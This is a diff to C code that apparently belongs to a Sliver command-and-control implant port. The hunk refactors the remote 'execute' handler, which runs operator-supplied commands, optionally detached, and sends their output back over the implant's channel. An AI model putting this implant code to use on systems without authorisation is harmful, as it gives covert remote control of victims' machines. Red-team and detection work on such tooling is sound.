@@ -303,26 +303,32 @@ static void execute_worker(void *arg) {
   }
   sliver_buf_init(&out_buf);
   sliver_buf_init(&err_buf);
-  if (job->background) {
-    /* Background: report the pid and return immediately, the child lives on. */
-    sliver_child_t *child = NULL;
-    if (sliver_child_spawn(job->path, argv, job->argc, &child, &pid) == 0) {
-      status = 0;
-      /* The child runs detached; close stdin so it does not block. */
-      sliver_child_close_stdin(child);
-      sliver_child_free(child);
-    } else {
+  {
+    const char *start_err = NULL;
+    if (job->background) {
+      /* Background: report the pid and return immediately, the child lives on. */
+      sliver_child_t *child = NULL;
+      if (sliver_child_spawn(job->path, argv, job->argc, &child, &pid) == 0) {
+        /* The child runs detached; close stdin so it does not block. */
+        sliver_child_close_stdin(child);
+        sliver_child_free(child);
+      } else {
+        status = 1;
+        start_err = "execute: cannot start process";
+      }
+    } else if (sliver_proc_exec(job->path, argv, job->argc, job->output, &out_buf, &err_buf,
+                                &pid, &status) != 0) {
+      /* Only a failure to *start* the child is an error: a non-zero exit code is
+       * reported through Status like the Go implant does. */
       status = 1;
+      start_err = "execute: cannot start process";
     }
-  } else if (sliver_proc_exec(job->path, argv, job->argc, job->output, &out_buf, &err_buf, &pid,
-                              &status) != 0) {
-    status = 1;
-  }
-  sliver_buf_init(&msg);
-  if (sliver_execute_encode(&msg, status, out_buf.data, out_buf.len, err_buf.data, err_buf.len,
-                            pid, status == 1 && msg.len == 0 ? "execute: cannot start process" : NULL) == 0) {
-    if (g_rpc_send != NULL) {
-      (void)g_rpc_send(job->envelope_id, SLIVER_MSG_EXECUTE_REQ, msg.data, msg.len);
+    sliver_buf_init(&msg);
+    if (sliver_execute_encode(&msg, status, out_buf.data, out_buf.len, err_buf.data,
+                              err_buf.len, pid, start_err) == 0) {
+      if (g_rpc_send != NULL) {
+        (void)g_rpc_send(job->envelope_id, SLIVER_MSG_EXECUTE_REQ, msg.data, msg.len);
+      }
     }
   }
   sliver_buf_free(&msg);
